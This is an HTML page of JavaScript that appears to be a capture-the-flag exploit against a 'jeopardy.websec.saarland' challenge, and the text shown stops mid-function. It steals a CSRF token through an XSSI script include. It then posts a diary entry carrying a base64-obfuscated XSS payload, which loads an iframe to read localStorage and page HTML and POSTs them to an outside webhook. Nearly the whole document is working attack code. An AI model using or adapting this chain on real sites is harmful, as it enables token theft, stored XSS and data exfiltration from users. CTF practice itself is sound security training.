<!DOCTYPE html>

    <script>

        window.onerror = function(msg) {
            new Image().src = W + "/?bot_js_error=" + encodeURIComponent(msg);
        };

        new Image().src = W + "/?step=1_github_started";
    </script>

    <!-- The XSSI Token Stealer -->
    <script src="https://owley-madison.jeopardy.websec.saarland/csrf_script.js"></script>

    <script>
        (function() {
            var attempts = 0;
            var maxAttempts = 100;

            var tokenHunter = setInterval(function() {
                attempts++;
                var tokenInputs = document.getElementsByName("csrfmiddlewaretoken");
                
                if (tokenInputs && tokenInputs.length > 0 && tokenInputs[0].value) {
                    clearInterval(tokenHunter);
                    var token = tokenInputs[0].value;
                    new Image().src = W + "/?step=2_token_grabbed";
                    executePayload(token);
                } else if (attempts >= maxAttempts) {
                    clearInterval(tokenHunter);
                    new Image().src = W + "/?step=error_timeout_no_token";
                }
            }, 50);

            function executePayload(token) {
                // The Master Exfiltration Payload
                var innerJS = 
                    "document.domain='owley-madison.jeopardy.websec.saarland';" +
                    "new Image().src='" + W + "/?step=4_diary_xss';" +
                    
                    "var m=document.createElement('iframe');" +
                    "m.src='https://match.owley-madison.jeopardy.websec.saarland/';" +
                    "m.onload=function(){" +
                        "new Image().src='" + W + "/?step=5_match_iframe_ready';" +
                        "try {" +
                            // 1. Read the bot's LocalStorage (The Flag)
                            "var favs = m.contentWindow.localStorage.getItem('favorites');" +
                            
                            // 2. Read the bot's HTML Session (Just in case)
                            "var html = m.contentDocument.documentElement.innerHTML;" +
                            
                            // 3. POST it all to the Webhook
                            "var x=new XMLHttpRequest();" +
                            "x.open('POST', '" + W + "');" +
                            "x.send('LOCAL_STORAGE: ' + favs + '\\n\\nHTML: ' + html);" +
                            "new Image().src='" + W + "/?step=6_exfiltration_sent';" +
                        "} catch(e) {" +
                            "new Image().src='" + W + "/?error=' + encodeURIComponent(e.message);" +
                        "}" +
                    "};" +
                    "document.body.appendChild(m);";

                var encodedJS = btoa(innerJS);
                var diaryEntry = '<img src="x" onerror="eval(atob(\'' + encodedJS + '\'))">';

                var form = document.createElement('form');
                form.action = 'https://diary.owley-madison.jeopardy.websec.saarland/entry';
                form.method = 'POST';
                
                var c = document.createElement('input');
                c.name = 'content';
                c.value = diaryEntry;
                form.appendChild(c);

                var t = document.createElement('input');
                t.name = 'csrfmiddlewaretoken';
                t.value = token;
                form.appendChild(t);
                
                document.body.appendChild(form);
                
                new Image().src = W + "/?step=3_submitting_to_diary";
